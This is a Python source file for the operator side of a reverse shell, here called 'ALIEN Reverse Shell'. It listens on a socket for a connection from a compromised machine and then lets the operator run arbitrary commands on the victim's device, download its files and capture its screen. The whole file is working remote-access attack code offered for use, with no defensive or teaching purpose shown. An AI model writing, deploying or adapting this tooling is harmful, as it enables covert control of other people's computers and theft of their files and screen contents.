try:
    import base64, binascii             
    import libs.clib as clib
    import colorama
    import sys
    from colorama import Fore
    from socket import *
    from PIL import ImageGrab, Image 
except:                                # if system dose does not have any of this libs throw an error
    print("ERROR: Requirements does not found. exiting...")

if len(sys.argv) < 3:
    sys.exit()

HOST = sys.argv[1]
PORT = int(sys.argv[2])

Intro = r""""""


Server  = socket(AF_INET,SOCK_STREAM)   

Server.bind((HOST, PORT))               # binding IP and port 
print(Fore.BLUE+'[*]'+Fore.RESET+f' Started Reverse TCP Connection At {HOST}:{PORT}')
Server.listen(1)                        # waiting for the user to connect 
print(clib.text(Fore.YELLOW+"[+]"+Fore.RESET+f" Got Connection From: {HOST}:{PORT}").Color())  # if we got connection show target IP

Client, Addr = Server.accept()                              # our client and client info module and accepting the connection 

print(clib.text(Intro).Art())                               #showing our intro art

while True:                                                     #start while True 

    print(clib.text("\033[4mtmf\033[0m-\033[4mshell\033[0m > ").Color(), end="")      # ask the user for command 
    Shell_User   = input()                                      # Get the command
    L_Shell_User = Shell_User.split(" ")                        # convert command to list

    if Shell_User == "quit":                                    # if user said quit 
        Client.send(bytes(Shell_User, encoding="utf-8"))        # send quit request to client 
        print(Fore.RED+'[-]'+Fore.RESET+' Exit...')
        quit()                                                  # end then quit

    elif L_Shell_User[0] == "file":                             # if user went to get file form client 

        if L_Shell_User[1] == "get":                                    
            Client.send(bytes(Shell_User, encoding="utf-8"))            # send request to client
            FileDate = binascii.a2b_base64(Client.recv(1073741824))     # get file date in base60 
            with open(f"Copy_{L_Shell_User[2]}", "wb") as File:         # save the date in file 
                File.write(FileDate)                                    # write file 

    elif L_Shell_User[0] == "showscreen":                               # if user went to get screnshot form client 
        Client.send(bytes(Shell_User, encoding="utf-8"))                # send request to client 
        FileDate = binascii.a2b_base64(Client.recv(1073741824))         # open file 
        with open(f"/root/.tmf/Screen.png", "wb") as File: File.write(FileDate)    # save file date as png
        print(Fore.YELLOW+'[+]'+Fore.RESET+' Image Saved At: "/root/.tmf" as Screen.png')
        Image.open("/root/.tmf/Screen.png").show()

    elif L_Shell_User[0] == "help":                                     # if user entred invalid command or asked for help 
        print("""
ALIEN Reverse Shell Commands
============================

1 -> file get FILENAME     | get files from user
2 -> "command"             | run command(s) on users device
3 -> showscreen            | get screenshot from user
4 -> chdir path\dir        | change the directory "cd"
5 -> path                  | show current directory (path)
6 -> back                  | Go back from existing directory (one-by)
""")

    else:
        Client.send(bytes(Shell_User, encoding="utf-8"))               # if user didnt entred any command send raw command 
        Client_R   = str(Client.recv(1024), 'utf-8')                   # if user didnt entred any command show raw command 

        print(Client_R)                                                # print client respond 